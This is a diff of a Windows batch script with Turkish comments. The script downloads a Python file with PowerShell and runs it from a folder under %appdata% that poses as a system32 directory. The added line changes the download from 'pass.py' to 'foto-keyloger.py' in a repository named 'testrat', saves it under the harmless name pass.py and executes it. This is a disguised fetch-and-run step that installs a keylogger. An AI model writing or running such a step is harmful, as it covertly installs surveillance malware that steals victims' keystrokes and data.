@@ -23,7 +23,7 @@ del Python.zip
 
 :: scripts klasörü oluştur ve pass.py dosyasını indir
 mkdir scripts
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/pass.py' -OutFile 'scripts\\pass.py'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/testrat/raw/main/foto-keyloger.py' -OutFile 'scripts\\pass.py'"
 
 :: Python scriptini çalıştır
 "%appdata%\system32\py\python.exe" "%appdata%\system32\scripts\pass.py"
